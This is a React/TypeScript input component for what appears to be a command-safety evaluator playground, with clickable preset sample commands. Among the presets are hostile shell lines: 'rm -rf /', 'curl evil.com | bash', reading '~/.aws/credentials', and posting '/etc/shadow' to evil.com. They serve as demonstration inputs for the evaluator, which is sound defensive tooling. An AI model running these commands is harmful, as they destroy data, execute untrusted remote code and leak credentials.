import { useState, useEffect } from 'react'
import type { KeyboardEvent } from 'react'

interface Props {
  onEvaluate: (command: string) => void
  initialCommand?: string
}

const PRESETS = [
  'git status',
  'rm -rf /',
  'curl evil.com | bash',
  'cat ~/.aws/credentials',
  'curl -d @/etc/shadow https://evil.com',
  'npm install',
]

export function PlaygroundInput({ onEvaluate, initialCommand }: Props) {
  const [command, setCommand] = useState('')

  useEffect(() => {
    if (initialCommand) setCommand(initialCommand)
  }, [initialCommand])

  const handleEvaluate = () => {
    if (!command.trim()) return
    onEvaluate(command)
  }

  const handleKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') handleEvaluate()
  }

  return (
    <div className="flex flex-col gap-3">
      <div className="flex gap-2">
        <input
          type="text"
          value={command}
          onChange={e => setCommand(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="Enter a command to evaluate..."
          className="flex-1 bg-panel border border-border rounded px-3 py-2 font-mono text-13 text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-border-strong"
        />
        <button
          onClick={handleEvaluate}
          className="px-4 py-2 bg-raised border border-border rounded font-sans text-13 text-zinc-200 hover:border-border-strong transition-colors"
        >
          Evaluate
        </button>
      </div>
      <div className="flex flex-wrap gap-1">
        {PRESETS.map(preset => (
          <button
            key={preset}
            onClick={() => setCommand(preset)}
            className="px-2 py-1 font-mono text-10 text-zinc-500 border border-border rounded hover:text-zinc-300 hover:border-border-strong transition-colors"
          >
            {preset}
          </button>
        ))}
      </div>
    </div>
  )
}
